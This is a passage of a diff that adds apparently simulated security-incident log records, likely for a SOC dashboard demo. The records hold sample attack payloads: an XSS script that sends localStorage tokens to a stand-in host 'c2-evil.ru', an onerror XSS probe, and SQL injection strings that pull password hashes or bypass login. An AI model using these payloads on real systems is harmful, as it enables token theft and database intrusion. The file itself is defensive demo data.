+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296132550",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:45:32",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296130536",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:45:30",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296124528",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:45:24",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296120501",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:45:20",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296118490",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:45:18",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296114473",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:45:14",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296112470",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:45:12",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296110467",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:45:10",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296104437",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:45:04",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296100427",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:45:00",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296098423",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:44:58",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296092400",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:44:52",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296090395",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:44:50",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296078356",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:44:38",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296076356",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:44:36",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296074356",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:44:34",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296072356",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:44:32",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296070342",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:44:30",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296066323",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:44:26",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296064308",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:44:24",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296056292",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:44:16",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296054278",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:44:14",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296052264",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:44:12",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296050260",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:44:10",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296044233",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:44:04",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296038208",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:43:58",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296036193",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:43:56",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296030190",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:43:50",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296026185",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:43:46",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296024183",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:43:44",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296022184",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:43:42",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296020173",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:43:40",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296018161",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:43:38",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296016151",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:43:36",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296008107",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:43:28",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296004092",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:43:24",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296002084",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:43:22",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295992049",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:43:12",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295988039",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:43:08",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295986031",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:43:06",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295982023",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:43:02",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295975990",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:42:55",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295973978",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:42:53",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295965966",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:42:45",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295963958",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:42:43",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295961957",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:42:41",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295959955",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:42:39",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295957955",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:42:37",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295955953",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:42:35",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295953946",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:42:33",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295945896",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:42:25",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295943890",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:42:23",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295939872",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:42:19",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295937866",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:42:17",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295933851",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:42:13",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295927811",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:42:07",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295925798",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:42:05",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295921779",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:42:01",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295919776",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:41:59",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295917775",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:41:57",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295915769",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:41:55",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295913754",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:41:53",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295911747",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:41:51",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295909733",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:41:49",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295907729",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:41:47",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295905716",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:41:45",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295903708",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:41:43",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295901697",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:41:41",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295897687",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:41:37",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295895681",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:41:35",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295893667",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:41:33",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295889656",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:41:29",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295887648",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:41:27",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295885648",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:41:25",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295883648",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:41:23",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295881647",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:41:21",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295877643",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:41:17",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295875633",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:41:15",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295873622",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:41:13",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295867615",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:41:07",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295863605",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:41:03",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295855571",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:40:55",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295853566",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:40:53",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295851550",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:40:51",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295849542",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:40:49",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295845520",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:40:45",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295843520",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:40:43",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295837497",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:40:37",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295835485",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:40:35",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295833485",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:40:33",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295831467",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:40:31",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295829452",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:40:29",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295827448",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:40:27",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295825436",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:40:25",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295823434",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:40:23",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295821419",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:40:21",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295819418",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:40:19",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295817411",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:40:17",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295809402",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:40:09",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295805384",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:40:05",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295803369",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:40:03",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295801369",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:40:01",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295799354",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:39:59",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295797345",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:39:57",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295793331",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:39:53",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295791319",
